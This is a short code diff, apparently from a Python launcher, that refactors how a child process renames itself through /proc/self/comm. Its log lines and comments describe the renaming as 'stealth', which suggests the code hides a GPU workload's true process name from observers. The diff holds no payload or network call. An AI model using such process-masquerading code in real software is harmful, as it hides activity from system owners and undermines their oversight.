@@ -212,6 +212,8 @@ def main():
                 b = filtered.encode('utf-8')[:15]
                 return b.decode('utf-8', errors='ignore')
 
+            safe_name = _sanitize_comm_name(child_target_name)
+
             def _child_preexec():
                 """
                 Child pre-exec hook: tách nhóm tiến trình và tự đổi tên qua /proc/self/comm.
@@ -222,9 +224,8 @@ def main():
                 except Exception:
                     pass
                 try:
-                    target = _sanitize_comm_name(child_target_name)
                     with open("/proc/self/comm", "wb") as f:
-                        f.write(target.encode("utf-8"))
+                        f.write(safe_name.encode("utf-8"))
                 except Exception:
                     pass
 
@@ -239,11 +240,10 @@ def main():
             # ---- New: Rename child PID and register to DirectPIDRegistry ----
             try:
                 # /proc/<pid>/comm expects ≤15 byte; child self-rename đã được thiết lập qua preexec_fn
-                new_name = child_target_name
+                new_name = safe_name
                 
                 # ✅ Child self-rename sẽ chạy trong preexec_fn; giữ background thread như fallback
                 logger.info(f"🔒 [GPU-POST-EXEC-STEALTH] Child self-rename scheduled via preexec_fn (PID {process.pid}) target='{new_name}'")
-                rename_success = True
                 
                 # Enhanced background stealth with improved container compatibility
                 def _enhanced_stealth_rename():
